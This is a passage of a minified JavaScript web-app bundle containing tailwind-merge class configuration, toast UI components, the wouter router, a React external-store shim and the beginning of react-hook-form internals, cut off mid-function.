        }],
        "min-h": [{
          "min-h": [ee, t, "min", "max", "fit", "svh", "lvh", "dvh"]
        }],
        "max-h": [{
          "max-h": [ee, t, "min", "max", "fit", "svh", "lvh", "dvh"]
        }],
        size: [{
          size: [ee, t, "auto", "min", "max", "fit"]
        }],
        "font-size": [{
          text: ["base", qn, Qn]
        }],
        "font-smoothing": ["antialiased", "subpixel-antialiased"],
        "font-style": ["italic", "not-italic"],
        "font-weight": [{
          font: ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black", Gc]
        }],
        "font-family": [{
          font: [Eo]
        }],
        "fvn-normal": ["normal-nums"],
        "fvn-ordinal": ["ordinal"],
        "fvn-slashed-zero": ["slashed-zero"],
        "fvn-figure": ["lining-nums", "oldstyle-nums"],
        "fvn-spacing": ["proportional-nums", "tabular-nums"],
        "fvn-fraction": ["diagonal-fractions", "stacked-fractons"],
        tracking: [{
          tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", ee]
        }],
        "line-clamp": [{
          "line-clamp": ["none", Os, Gc]
        }],
        leading: [{
          leading: ["none", "tight", "snug", "normal", "relaxed", "loose", wn, ee]
        }],
        "list-image": [{
          "list-image": ["none", ee]
        }],
        "list-style-type": [{
          list: ["none", "disc", "decimal", ee]
        }],
        "list-style-position": [{
          list: ["inside", "outside"]
        }],
        "placeholder-color": [{
          placeholder: [e]
        }],
        "placeholder-opacity": [{
          "placeholder-opacity": [g]
        }],
        "text-alignment": [{
          text: ["left", "center", "right", "justify", "start", "end"]
        }],
        "text-color": [{
          text: [e]
        }],
        "text-opacity": [{
          "text-opacity": [g]
        }],
        "text-decoration": ["underline", "overline", "line-through", "no-underline"],
        "text-decoration-style": [{
          decoration: [...se(), "wavy"]
        }],
        "text-decoration-thickness": [{
          decoration: ["auto", "from-font", wn, Qn]
        }],
        "underline-offset": [{
          "underline-offset": ["auto", wn, ee]
        }],
        "text-decoration-color": [{
          decoration: [e]
        }],
        "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
        "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
        "text-wrap": [{
          text: ["wrap", "nowrap", "balance", "pretty"]
        }],
        indent: [{
          indent: I()
        }],
        "vertical-align": [{
          align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", ee]
        }],
        whitespace: [{
          whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
        }],
        break: [{
          break: ["normal", "words", "all", "keep"]
        }],
        hyphens: [{
          hyphens: ["none", "manual", "auto"]
        }],
        content: [{
          content: ["none", ee]
        }],
        "bg-attachment": [{
          bg: ["fixed", "local", "scroll"]
        }],
        "bg-clip": [{
          "bg-clip": ["border", "padding", "content", "text"]
        }],
        "bg-opacity": [{
          "bg-opacity": [g]
        }],
        "bg-origin": [{
          "bg-origin": ["border", "padding", "content"]
        }],
        "bg-position": [{
          bg: [...te(), RN]
        }],
        "bg-repeat": [{
          bg: ["no-repeat", {
            repeat: ["", "x", "y", "round", "space"]
          }]
        }],
        "bg-size": [{
          bg: ["auto", "cover", "contain", MN]
        }],
        "bg-image": [{
          bg: ["none", {
            "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
          }, IN]
        }],
        "bg-color": [{
          bg: [e]
        }],
        "gradient-from-pos": [{
          from: [b]
        }],
        "gradient-via-pos": [{
          via: [b]
        }],
        "gradient-to-pos": [{
          to: [b]
        }],
        "gradient-from": [{
          from: [y]
        }],
        "gradient-via": [{
          via: [y]
        }],
        "gradient-to": [{
          to: [y]
        }],
        rounded: [{
          rounded: [o]
        }],
        "rounded-s": [{
          "rounded-s": [o]
        }],
        "rounded-e": [{
          "rounded-e": [o]
        }],
        "rounded-t": [{
          "rounded-t": [o]
        }],
        "rounded-r": [{
          "rounded-r": [o]
        }],
        "rounded-b": [{
          "rounded-b": [o]
        }],
        "rounded-l": [{
          "rounded-l": [o]
        }],
        "rounded-ss": [{
          "rounded-ss": [o]
        }],
        "rounded-se": [{
          "rounded-se": [o]
        }],
        "rounded-ee": [{
          "rounded-ee": [o]
        }],
        "rounded-es": [{
          "rounded-es": [o]
        }],
        "rounded-tl": [{
          "rounded-tl": [o]
        }],
        "rounded-tr": [{
          "rounded-tr": [o]
        }],
        "rounded-br": [{
          "rounded-br": [o]
        }],
        "rounded-bl": [{
          "rounded-bl": [o]
        }],
        "border-w": [{
          border: [l]
        }],
        "border-w-x": [{
          "border-x": [l]
        }],
        "border-w-y": [{
          "border-y": [l]
        }],
        "border-w-s": [{
          "border-s": [l]
        }],
        "border-w-e": [{
          "border-e": [l]
        }],
        "border-w-t": [{
          "border-t": [l]
        }],
        "border-w-r": [{
          "border-r": [l]
        }],
        "border-w-b": [{
          "border-b": [l]
        }],
        "border-w-l": [{
          "border-l": [l]
        }],
        "border-opacity": [{
          "border-opacity": [g]
        }],
        "border-style": [{
          border: [...se(), "hidden"]
        }],
        "divide-x": [{
          "divide-x": [l]
        }],
        "divide-x-reverse": ["divide-x-reverse"],
        "divide-y": [{
          "divide-y": [l]
        }],
        "divide-y-reverse": ["divide-y-reverse"],
        "divide-opacity": [{
          "divide-opacity": [g]
        }],
        "divide-style": [{
          divide: se()
        }],
        "border-color": [{
          border: [s]
        }],
        "border-color-x": [{
          "border-x": [s]
        }],
        "border-color-y": [{
          "border-y": [s]
        }],
        "border-color-s": [{
          "border-s": [s]
        }],
        "border-color-e": [{
          "border-e": [s]
        }],
        "border-color-t": [{
          "border-t": [s]
        }],
        "border-color-r": [{
          "border-r": [s]
        }],
        "border-color-b": [{
          "border-b": [s]
        }],
        "border-color-l": [{
          "border-l": [s]
        }],
        "divide-color": [{
          divide: [s]
        }],
        "outline-style": [{
          outline: ["", ...se()]
        }],
        "outline-offset": [{
          "outline-offset": [wn, ee]
        }],
        "outline-w": [{
          outline: [wn, Qn]
        }],
        "outline-color": [{
          outline: [e]
        }],
        "ring-w": [{
          ring: H()
        }],
        "ring-w-inset": ["ring-inset"],
        "ring-color": [{
          ring: [e]
        }],
        "ring-opacity": [{
          "ring-opacity": [g]
        }],
        "ring-offset-w": [{
          "ring-offset": [wn, Qn]
        }],
        "ring-offset-color": [{
          "ring-offset": [e]
        }],
        shadow: [{
          shadow: ["", "inner", "none", qn, _N]
        }],
        "shadow-color": [{
          shadow: [Eo]
        }],
        opacity: [{
          opacity: [g]
        }],
        "mix-blend": [{
          "mix-blend": [...X(), "plus-lighter", "plus-darker"]
        }],
        "bg-blend": [{
          "bg-blend": X()
        }],
        filter: [{
          filter: ["", "none"]
        }],
        blur: [{
          blur: [n]
        }],
        brightness: [{
          brightness: [r]
        }],
        contrast: [{
          contrast: [c]
        }],
        "drop-shadow": [{
          "drop-shadow": ["", "none", qn, ee]
        }],
        grayscale: [{
          grayscale: [u]
        }],
        "hue-rotate": [{
          "hue-rotate": [d]
        }],
        invert: [{
          invert: [f]
        }],
        saturate: [{
          saturate: [p]
        }],
        sepia: [{
          sepia: [S]
        }],
        "backdrop-filter": [{
          "backdrop-filter": ["", "none"]
        }],
        "backdrop-blur": [{
          "backdrop-blur": [n]
        }],
        "backdrop-brightness": [{
          "backdrop-brightness": [r]
        }],
        "backdrop-contrast": [{
          "backdrop-contrast": [c]
        }],
        "backdrop-grayscale": [{
          "backdrop-grayscale": [u]
        }],
        "backdrop-hue-rotate": [{
          "backdrop-hue-rotate": [d]
        }],
        "backdrop-invert": [{
          "backdrop-invert": [f]
        }],
        "backdrop-opacity": [{
          "backdrop-opacity": [g]
        }],
        "backdrop-saturate": [{
          "backdrop-saturate": [p]
        }],
        "backdrop-sepia": [{
          "backdrop-sepia": [S]
        }],
        "border-collapse": [{
          border: ["collapse", "separate"]
        }],
        "border-spacing": [{
          "border-spacing": [i]
        }],
        "border-spacing-x": [{
          "border-spacing-x": [i]
        }],
        "border-spacing-y": [{
          "border-spacing-y": [i]
        }],
        "table-layout": [{
          table: ["auto", "fixed"]
        }],
        caption: [{
          caption: ["top", "bottom"]
        }],
        transition: [{
          transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", ee]
        }],
        duration: [{
          duration: J()
        }],
        ease: [{
          ease: ["linear", "in", "out", "in-out", ee]
        }],
        delay: [{
          delay: J()
        }],
        animate: [{
          animate: ["none", "spin", "ping", "pulse", "bounce", ee]
        }],
        transform: [{
          transform: ["", "gpu", "none"]
        }],
        scale: [{
          scale: [w]
        }],
        "scale-x": [{
          "scale-x": [w]
        }],
        "scale-y": [{
          "scale-y": [w]
        }],
        rotate: [{
          rotate: [Ao, ee]
        }],
        "translate-x": [{
          "translate-x": [A]
        }],
        "translate-y": [{
          "translate-y": [A]
        }],
        "skew-x": [{
          "skew-x": [N]
        }],
        "skew-y": [{
          "skew-y": [N]
        }],
        "transform-origin": [{
          origin: ["center", "top", "top-right", "right", "bottom-right", "bottom", "bottom-left", "left", "top-left", ee]
        }],
        accent: [{
          accent: ["auto", e]
        }],
        appearance: [{
          appearance: ["none", "auto"]
        }],
        cursor: [{
          cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", ee]
        }],
        "caret-color": [{
          caret: [e]
        }],
        "pointer-events": [{
          "pointer-events": ["none", "auto"]
        }],
        resize: [{
          resize: ["none", "y", "x", ""]
        }],
        "scroll-behavior": [{
          scroll: ["auto", "smooth"]
        }],
        "scroll-m": [{
          "scroll-m": I()
        }],
        "scroll-mx": [{
          "scroll-mx": I()
        }],
        "scroll-my": [{
          "scroll-my": I()
        }],
        "scroll-ms": [{
          "scroll-ms": I()
        }],
        "scroll-me": [{
          "scroll-me": I()
        }],
        "scroll-mt": [{
          "scroll-mt": I()
        }],
        "scroll-mr": [{
          "scroll-mr": I()
        }],
        "scroll-mb": [{
          "scroll-mb": I()
        }],
        "scroll-ml": [{
          "scroll-ml": I()
        }],
        "scroll-p": [{
          "scroll-p": I()
        }],
        "scroll-px": [{
          "scroll-px": I()
        }],
        "scroll-py": [{
          "scroll-py": I()
        }],
        "scroll-ps": [{
          "scroll-ps": I()
        }],
        "scroll-pe": [{
          "scroll-pe": I()
        }],
        "scroll-pt": [{
          "scroll-pt": I()
        }],
        "scroll-pr": [{
          "scroll-pr": I()
        }],
        "scroll-pb": [{
          "scroll-pb": I()
        }],
        "scroll-pl": [{
          "scroll-pl": I()
        }],
        "snap-align": [{
          snap: ["start", "end", "center", "align-none"]
        }],
        "snap-stop": [{
          snap: ["normal", "always"]
        }],
        "snap-type": [{
          snap: ["none", "x", "y", "both"]
        }],
        "snap-strictness": [{
          snap: ["mandatory", "proximity"]
        }],
        touch: [{
          touch: ["auto", "none", "manipulation"]
        }],
        "touch-x": [{
          "touch-pan": ["x", "left", "right"]
        }],
        "touch-y": [{
          "touch-pan": ["y", "up", "down"]
        }],
        "touch-pz": ["touch-pinch-zoom"],
        select: [{
          select: ["none", "text", "all", "auto"]
        }],
        "will-change": [{
          "will-change": ["auto", "scroll", "contents", "transform", ee]
        }],
        fill: [{
          fill: [e, "none"]
        }],
        "stroke-w": [{
          stroke: [wn, Qn, Gc]
        }],
        stroke: [{
          stroke: [e, "none"]
        }],
        sr: ["sr-only", "not-sr-only"],
        "forced-color-adjust": [{
          "forced-color-adjust": ["auto", "none"]
        }]
      },
      conflictingClassGroups: {
        overflow: ["overflow-x", "overflow-y"],
        overscroll: ["overscroll-x", "overscroll-y"],
        inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
        "inset-x": ["right", "left"],
        "inset-y": ["top", "bottom"],
        flex: ["basis", "grow", "shrink"],
        gap: ["gap-x", "gap-y"],
        p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
        px: ["pr", "pl"],
        py: ["pt", "pb"],
        m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
        mx: ["mr", "ml"],
        my: ["mt", "mb"],
        size: ["w", "h"],
        "font-size": ["leading"],
        "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
        "fvn-ordinal": ["fvn-normal"],
        "fvn-slashed-zero": ["fvn-normal"],
        "fvn-figure": ["fvn-normal"],
        "fvn-spacing": ["fvn-normal"],
        "fvn-fraction": ["fvn-normal"],
        "line-clamp": ["display", "overflow"],
        rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
        "rounded-s": ["rounded-ss", "rounded-es"],
        "rounded-e": ["rounded-se", "rounded-ee"],
        "rounded-t": ["rounded-tl", "rounded-tr"],
        "rounded-r": ["rounded-tr", "rounded-br"],
        "rounded-b": ["rounded-br", "rounded-bl"],
        "rounded-l": ["rounded-tl", "rounded-bl"],
        "border-spacing": ["border-spacing-x", "border-spacing-y"],
        "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
        "border-w-x": ["border-w-r", "border-w-l"],
        "border-w-y": ["border-w-t", "border-w-b"],
        "border-color": ["border-color-s", "border-color-e", "border-color-t", "border-color-r", "border-color-b", "border-color-l"],
        "border-color-x": ["border-color-r", "border-color-l"],
        "border-color-y": ["border-color-t", "border-color-b"],
        "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
        "scroll-mx": ["scroll-mr", "scroll-ml"],
        "scroll-my": ["scroll-mt", "scroll-mb"],
        "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
        "scroll-px": ["scroll-pr", "scroll-pl"],
        "scroll-py": ["scroll-pt", "scroll-pb"],
        touch: ["touch-x", "touch-y", "touch-pz"],
        "touch-x": ["touch"],
        "touch-y": ["touch"],
        "touch-pz": ["touch"]
      },
      conflictingClassGroupModifiers: {
        "font-size": ["leading"]
      }
    }
  }
  , zN = SN(BN);
function Et(...e) {
  return zN(cN(e))
}
const UN = KC
  , gx = x.forwardRef(({ className: e, ...t }, n) => a.jsx(ex, {
    ref: n,
    className: Et("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]", e),
    ...t
  }));
gx.displayName = ex.displayName;
const $N = ax("group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full", {
  variants: {
    variant: {
      default: "border bg-background text-foreground",
      destructive: "destructive group border-destructive bg-destructive text-destructive-foreground"
    }
  },
  defaultVariants: {
    variant: "default"
  }
})
  , yx = x.forwardRef(({ className: e, variant: t, ...n }, r) => a.jsx(tx, {
    ref: r,
    className: Et($N({
      variant: t
    }), e),
    ...n
  }));
yx.displayName = tx.displayName;
const HN = x.forwardRef(({ className: e, ...t }, n) => a.jsx(sx, {
  ref: n,
  className: Et("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-muted/40 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive", e),
  ...t
}));
HN.displayName = sx.displayName;
const vx = x.forwardRef(({ className: e, ...t }, n) => a.jsx(ox, {
  ref: n,
  className: Et("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600", e),
  "toast-close": "",
  ...t,
  children: a.jsx(cx, {
    className: "h-4 w-4"
  })
}));
vx.displayName = ox.displayName;
const xx = x.forwardRef(({ className: e, ...t }, n) => a.jsx(nx, {
  ref: n,
  className: Et("text-sm font-semibold", e),
  ...t
}));
xx.displayName = nx.displayName;
const wx = x.forwardRef(({ className: e, ...t }, n) => a.jsx(rx, {
  ref: n,
  className: Et("text-sm opacity-90", e),
  ...t
}));
wx.displayName = rx.displayName;
function WN() {
  const { toasts: e } = sC();
  return a.jsxs(UN, {
    children: [e.map(function ({ id: t, title: n, description: r, action: s, ...o }) {
      return a.jsxs(yx, {
        ...o,
        children: [a.jsxs("div", {
          className: "grid gap-1",
          children: [n && a.jsx(xx, {
            children: n
          }), r && a.jsx(wx, {
            children: r
          })]
        }), s, a.jsx(vx, {})]
      }, t)
    }), a.jsx(gx, {})]
  })
}
function QN(e, t) {
  if (e instanceof RegExp)
    return {
      keys: !1,
      pattern: e
    };
  var n, r, s, o, i = [], l = "", c = e.split("/");
  for (c[0] || c.shift(); s = c.shift();)
    n = s[0],
      n === "*" ? (i.push(n),
        l += s[1] === "?" ? "(?:/(.*))?" : "/(.*)") : n === ":" ? (r = s.indexOf("?", 1),
          o = s.indexOf(".", 1),
          i.push(s.substring(1, ~r ? r : ~o ? o : s.length)),
          l += ~r && !~o ? "(?:/([^/]+?))?" : "/([^/]+?)",
          ~o && (l += (~r ? "?" : "") + "\\" + s.substring(o))) : l += "/" + s;
  return {
    keys: i,
    pattern: new RegExp("^" + l + (t ? "(?=$|/)" : "/?$"), "i")
  }
}
var bx = {
  exports: {}
}
  , Sx = {};
/**
 * @license React
 * use-sync-external-store-shim.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Js = x;
function qN(e, t) {
  return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var GN = typeof Object.is == "function" ? Object.is : qN
  , KN = Js.useState
  , YN = Js.useEffect
  , XN = Js.useLayoutEffect
  , JN = Js.useDebugValue;
function ZN(e, t) {
  var n = t()
    , r = KN({
      inst: {
        value: n,
        getSnapshot: t
      }
    })
    , s = r[0].inst
    , o = r[1];
  return XN(function () {
    s.value = n,
      s.getSnapshot = t,
      Kc(s) && o({
        inst: s
      })
  }, [e, n, t]),
    YN(function () {
      return Kc(s) && o({
        inst: s
      }),
        e(function () {
          Kc(s) && o({
            inst: s
          })
        })
    }, [e]),
    JN(n),
    n
}
function Kc(e) {
  var t = e.getSnapshot;
  e = e.value;
  try {
    var n = t();
    return !GN(e, n)
  } catch {
    return !0
  }
}
function ej(e, t) {
  return t()
}
var tj = typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u" ? ej : ZN;
Sx.useSyncExternalStore = Js.useSyncExternalStore !== void 0 ? Js.useSyncExternalStore : tj;
bx.exports = Sx;
var nj = bx.exports;
const rj = gb.useInsertionEffect
  , sj = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u"
  , oj = sj ? x.useLayoutEffect : x.useEffect
  , ij = rj || oj
  , Cx = e => {
    const t = x.useRef([e, (...n) => t[0](...n)]).current;
    return ij(() => {
      t[0] = e
    }
    ),
      t[1]
  }
  , aj = "popstate"
  , $f = "pushState"
  , Hf = "replaceState"
  , lj = "hashchange"
  , up = [aj, $f, Hf, lj]
  , cj = e => {
    for (const t of up)
      addEventListener(t, e);
    return () => {
      for (const t of up)
        removeEventListener(t, e)
    }
  }
  , Nx = (e, t) => nj.useSyncExternalStore(cj, e, t)
  , uj = () => location.search
  , dj = ({ ssrSearch: e = "" } = {}) => Nx(uj, () => e)
  , dp = () => location.pathname
  , fj = ({ ssrPath: e } = {}) => Nx(dp, e ? () => e : dp)
  , hj = (e, { replace: t = !1, state: n = null } = {}) => history[t ? Hf : $f](n, "", e)
  , mj = (e = {}) => [fj(e), hj]
  , fp = Symbol.for("wouter_v3");
if (typeof history < "u" && typeof window[fp] > "u") {
  for (const e of [$f, Hf]) {
    const t = history[e];
    history[e] = function () {
      const n = t.apply(this, arguments)
        , r = new Event(e);
      return r.arguments = arguments,
        dispatchEvent(r),
        n
    }
  }
  Object.defineProperty(window, fp, {
    value: !0
  })
}
const pj = (e, t) => t.toLowerCase().indexOf(e.toLowerCase()) ? "~" + t : t.slice(e.length) || "/"
  , jx = (e = "") => e === "/" ? "" : e
  , gj = (e, t) => e[0] === "~" ? e.slice(1) : jx(t) + e
  , yj = (e = "", t) => pj(hp(jx(e)), hp(t))
  , hp = e => {
    try {
      return decodeURI(e)
    } catch {
      return e
    }
  }
  , Px = {
    hook: mj,
    searchHook: dj,
    parser: QN,
    base: "",
    ssrPath: void 0,
    ssrSearch: void 0,
    hrefs: e => e
  }
  , Ax = x.createContext(Px)
  , Ii = () => x.useContext(Ax)
  , Ex = {}
  , Tx = x.createContext(Ex)
  , kx = () => x.useContext(Tx)
  , Yl = e => {
    const [t, n] = e.hook(e);
    return [yj(e.base, t), Cx((r, s) => n(gj(r, e.base), s))]
  }
  , Un = () => Yl(Ii())
  , Dx = (e, t, n, r) => {
    const { pattern: s, keys: o } = t instanceof RegExp ? {
      keys: !1,
      pattern: t
    } : e(t || "*", r)
      , i = s.exec(n) || []
      , [l, ...c] = i;
    return l !== void 0 ? [!0, (() => {
      const u = o !== !1 ? Object.fromEntries(o.map((f, h) => [f, c[h]])) : i.groups;
      let d = {
        ...c
      };
      return u && Object.assign(d, u),
        d
    }
    )(), ...r ? [l] : []] : [!1, null]
  }
  , vj = ({ children: e, ...t }) => {
    var d, f;
    const n = Ii()
      , r = t.hook ? Px : n;
    let s = r;
    const [o, i] = ((d = t.ssrPath) == null ? void 0 : d.split("?")) ?? [];
    i && (t.ssrSearch = i,
      t.ssrPath = o),
      t.hrefs = t.hrefs ?? ((f = t.hook) == null ? void 0 : f.hrefs);
    let l = x.useRef({})
      , c = l.current
      , u = c;
    for (let h in r) {
      const y = h === "base" ? r[h] + (t[h] || "") : t[h] || r[h];
      c === u && y !== u[h] && (l.current = u = {
        ...u
      }),
        u[h] = y,
        y !== r[h] && (s = u)
    }
    return x.createElement(Ax.Provider, {
      value: s,
      children: e
    })
  }
  , mp = ({ children: e, component: t }, n) => t ? x.createElement(t, {
    params: n
  }) : typeof e == "function" ? e(n) : e
  , xj = e => {
    let t = x.useRef(Ex)
      , n = t.current;
    for (const r in e)
      e[r] !== n[r] && (n = e);
    return Object.keys(e).length === 0 && (n = e),
      t.current = n
  }
  , vt = ({ path: e, nest: t, match: n, ...r }) => {
    const s = Ii()
      , [o] = Yl(s)
      , [i, l, c] = n ?? Dx(s.parser, e, o, t)
      , u = xj({
        ...kx(),
        ...l
      });
    if (!i)
      return null;
    const d = c ? x.createElement(vj, {
      base: c
    }, mp(r, u)) : mp(r, u);
    return x.createElement(Tx.Provider, {
      value: u,
      children: d
    })
  }
  ;
x.forwardRef((e, t) => {
  const n = Ii()
    , [r, s] = Yl(n)
    , { to: o = "", href: i = o, onClick: l, asChild: c, children: u, className: d, replace: f, state: h, ...y } = e
    , b = Cx(C => {
      C.ctrlKey || C.metaKey || C.altKey || C.shiftKey || C.button !== 0 || (l == null || l(C),
        C.defaultPrevented || (C.preventDefault(),
          s(i, e)))
    }
    )
    , v = n.hrefs(i[0] === "~" ? i.slice(1) : n.base + i, n);
  return c && x.isValidElement(u) ? x.cloneElement(u, {
    onClick: b,
    href: v
  }) : x.createElement("a", {
    ...y,
    onClick: b,
    href: v,
    className: d != null && d.call ? d(r === i) : d,
    children: u,
    ref: t
  })
}
);
const Mx = e => Array.isArray(e) ? e.flatMap(t => Mx(t && t.type === x.Fragment ? t.props.children : t)) : [e]
  , wj = ({ children: e, location: t }) => {
    const n = Ii()
      , [r] = Yl(n);
    for (const s of Mx(e)) {
      let o = 0;
      if (x.isValidElement(s) && (o = Dx(n.parser, s.props.path, t || r, s.props.nest))[0])
        return x.cloneElement(s, {
          match: o
        })
    }
    return null
  }
  ;
var _i = e => e.type === "checkbox"
  , Vr = e => e instanceof Date
  , nt = e => e == null;
const Rx = e => typeof e == "object";
var ke = e => !nt(e) && !Array.isArray(e) && Rx(e) && !Vr(e)
  , bj = e => ke(e) && e.target ? _i(e.target) ? e.target.checked : e.target.value : e
  , Sj = e => e.substring(0, e.search(/\.\d+(\.|$)/)) || e
  , Cj = (e, t) => e.has(Sj(t))
  , Nj = e => {
    const t = e.constructor && e.constructor.prototype;
    return ke(t) && t.hasOwnProperty("isPrototypeOf")
  }
  , Wf = typeof window < "u" && typeof window.HTMLElement < "u" && typeof document < "u";
function Dt(e) {
  let t;
  const n = Array.isArray(e);
  if (e instanceof Date)
    t = new Date(e);
  else if (e instanceof Set)
    t = new Set(e);
  else if (!(Wf && (e instanceof Blob || e instanceof FileList)) && (n || ke(e)))
    if (t = n ? [] : {},
      !n && !Nj(e))
      t = e;
    else
      for (const r in e)
        e.hasOwnProperty(r) && (t[r] = Dt(e[r]));
  else
    return e;
  return t
}
var Xl = e => Array.isArray(e) ? e.filter(Boolean) : []
  , Ee = e => e === void 0
  , Q = (e, t, n) => {
    if (!t || !ke(e))
      return n;
    const r = Xl(t.split(/[,[\].]+?/)).reduce((s, o) => nt(s) ? s : s[o], e);
    return Ee(r) || r === e ? Ee(e[t]) ? n : e[t] : r
  }
  , sn = e => typeof e == "boolean"
  , Qf = e => /^\w*$/.test(e)
  , Ox = e => Xl(e.replace(/["|']|\]/g, "").split(/\.|\[/))
  , ge = (e, t, n) => {
    let r = -1;
    const s = Qf(t) ? [t] : Ox(t)
      , o = s.length
      , i = o - 1;
    for (; ++r < o;) {
      const l = s[r];
      let c = n;
      if (r !== i) {
        const u = e[l];
        c = ke(u) || Array.isArray(u) ? u : isNaN(+s[r + 1]) ? {} : []
      }
      if (l === "__proto__")
        return;
      e[l] = c,
        e = e[l]
    }
    return e
  }
  ;
const pp = {
  BLUR: "blur",
  FOCUS_OUT: "focusout",
  CHANGE: "change"
}
  , Xt = {
    onBlur: "onBlur",
    onChange: "onChange",
    onSubmit: "onSubmit",
    onTouched: "onTouched",
    all: "all"
  }
  , bn = {
    max: "max",
    min: "min",
    maxLength: "maxLength",
    minLength: "minLength",
    pattern: "pattern",
    required: "required",
    validate: "validate"
  };
ue.createContext(null);
var jj = (e, t, n, r = !0) => {
  const s = {
    defaultValues: t._defaultValues
  };
  for (const o in e)
    Object.defineProperty(s, o, {
      get: () => {
        const i = o;
        return t._proxyFormState[i] !== Xt.all && (t._proxyFormState[i] = !r || Xt.all),
          e[i]
      }
    });
  return s
}
  , lt = e => ke(e) && !Object.keys(e).length
  , Pj = (e, t, n, r) => {
    n(e);
    const { name: s, ...o } = e;
    return lt(o) || Object.keys(o).length >= Object.keys(t).length || Object.keys(o).find(i => t[i] === Xt.all)
  }
  , _a = e => Array.isArray(e) ? e : [e];
function Aj(e) {
  const t = ue.useRef(e);
  t.current = e,
    ue.useEffect(() => {
      const n = !e.disabled && t.current.subject && t.current.subject.subscribe({
        next: t.current.next
      });
      return () => {
        n && n.unsubscribe()
      }
    }
      , [e.disabled])
}
var fn = e => typeof e == "string"
  , Ej = (e, t, n, r, s) => fn(e) ? (r && t.watch.add(e),
    Q(n, e, s)) : Array.isArray(e) ? e.map(o => (r && t.watch.add(o),
      Q(n, o))) : (r && (t.watchAll = !0),
        n)
  , Tj = (e, t, n, r, s) => t ? {
    ...n[e],
    types: {
      ...n[e] && n[e].types ? n[e].types : {},
      [r]: s || !0
    }
  } : {}
  , gp = e => ({
    isOnSubmit: !e || e === Xt.onSubmit,
    isOnBlur: e === Xt.onBlur,
    isOnChange: e === Xt.onChange,
    isOnAll: e === Xt.all,
    isOnTouch: e === Xt.onTouched
  })
  , yp = (e, t, n) => !n && (t.watchAll || t.watch.has(e) || [...t.watch].some(r => e.startsWith(r) && /^\.\w+/.test(e.slice(r.length))));
const Ko = (e, t, n, r) => {
  for (const s of n || Object.keys(e)) {
    const o = Q(e, s);
    if (o) {
      const { _f: i, ...l } = o;
      if (i) {
        if (i.refs && i.refs[0] && t(i.refs[0], s) && !r)
          return !0;
        if (i.ref && t(i.ref, i.name) && !r)
          return !0;
        if (Ko(l, t))
          break
      } else if (ke(l) && Ko(l, t))
        break
    }
  }
}
  ;
var kj = (e, t, n) => {
  const r = _a(Q(e, n));
  return ge(r, "root", t[n]),
    ge(e, n, r),
    e
}
  , qf = e => e.type === "file"
  , An = e => typeof e == "function"
  , hl = e => {
    if (!Wf)
      return !1;
    const t = e ? e.ownerDocument : 0;
    return e instanceof (t && t.defaultView ? t.defaultView.HTMLElement : HTMLElement)
  }
  , La = e => fn(e)
  , Gf = e => e.type === "radio"
  , ml = e => e instanceof RegExp;
const vp = {
  value: !1,
  isValid: !1
}
  , xp = {
    value: !0,
    isValid: !0
  };
var Ix = e => {
  if (Array.isArray(e)) {
    if (e.length > 1) {
      const t = e.filter(n => n && n.checked && !n.disabled).map(n => n.value);
      return {
        value: t,
        isValid: !!t.length
      }
    }
